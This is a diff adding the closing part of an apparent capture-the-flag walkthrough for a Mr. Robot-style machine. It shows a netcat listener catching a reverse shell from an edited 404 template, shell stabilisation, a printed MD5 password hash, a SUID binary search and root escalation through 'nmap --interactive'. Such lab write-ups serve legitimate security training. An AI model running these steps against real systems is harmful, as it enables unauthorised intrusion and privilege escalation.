@@ -901,4 +901,96 @@ Okay now paste it into the 404 template and set up a netcat listener:
 
 
 
+`nc -lvnp 1234` 
 
+
+
+Now save the 404 template and go to “http://$IP/404.php&#8221;. And just like that we have a reverse shell. Now let’s stabilize it a little bit: 
+
+
+
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm 
+
+
+
+Now let’s see what we have into “robot” home folder:
+
+
+
+
+![image](https://user-images.githubusercontent.com/64806211/128558382-51230099-a1c8-4e80-bd66-20ba83422764.png)
+
+
+
+
+Hmmmm if we try to cat the key-2-of-3.txt we get a permission denied so let’s see what this password.raw-md5 is: 
+
+
+
+
+`cat password.raw-md5`
+
+
+
+
+`#output`
+
+
+
+
+`robot:c3fcd3d76192e4007dfb496cca67e13b`
+
+
+
+
+And if we crack it using an online md5 decrypter we get the password for the user robot. Now let’s change users:
+
+
+
+`su robot`
+
+
+
+
+`Enter password:`
+
+
+
+And boom we are robot. Now let’s cat out the key-2-of-3.txt and see what we can do: 
+
+
+
+
+`find / -perm +6000 2>/dev/null | grep '/bin/'`
+
+
+
+
+
+![image](https://user-images.githubusercontent.com/64806211/128559112-929202f8-190e-4f6c-a7e7-9ae79130b18c.png)
+
+
+
+
+
+
+
+Oh shiiiiiiiiit we can see nmap is running as root process so we can use it to get a root shell:
+
+
+
+
+`nmap --interactive` 
+
+
+
+
+![image](https://user-images.githubusercontent.com/64806211/128559387-c8782cbd-4599-4be1-a935-47eff8788c4b.png)
+
+
+
+
+BOOM BOOM BOOM
+we just completed the box. High five, yeah. Again thank you for the support, i hope you liked the write-up and expect more in the future.
